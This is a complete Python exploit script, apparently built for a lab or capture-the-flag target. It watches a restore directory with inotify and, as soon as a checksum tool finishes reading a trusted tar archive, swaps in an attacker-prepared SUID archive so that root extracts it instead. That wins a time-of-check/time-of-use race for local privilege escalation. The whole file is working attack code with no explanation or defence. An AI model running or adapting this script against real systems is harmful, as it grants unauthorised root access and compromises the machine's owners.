#!/usr/bin/env python3
"""inotify TOCTOU: after sha256sum closes the trusted tar, swap our SUID archive."""
import os
import sys
import ctypes
import struct

TARGET_DIR = "/var/restore_work"
TARGET_FILE = "_opt_blocksynergy.tar.gz"
REPLACEMENT = "/var/restore_work/restore_suid.tar.gz"
TARGET_PATH = os.path.join(TARGET_DIR, TARGET_FILE)

libc = ctypes.CDLL("libc.so.6", use_errno=True)
IN_CLOSE_NOWRITE = 0x00000010
EVENT_SIZE = struct.calcsize("iIII")

fd = libc.inotify_init()
if fd < 0 or libc.inotify_add_watch(fd, TARGET_DIR.encode(), IN_CLOSE_NOWRITE) < 0:
    sys.exit("[-] inotify setup failed")

print(f"[*] watching {TARGET_DIR} ...", flush=True)
while True:
    buf = os.read(fd, 4096)
    off = 0
    while off < len(buf):
        wd, mask, cookie, nlen = struct.unpack_from("iIII", buf, off)
        off += EVENT_SIZE
        name = buf[off : off + nlen].rstrip(b"\x00").decode()
        off += nlen
        if name == TARGET_FILE and os.path.exists(REPLACEMENT):
            os.rename(REPLACEMENT, TARGET_PATH)
            print("[+] swapped! root's tar will now extract OUR archive.", flush=True)
            sys.exit(0)
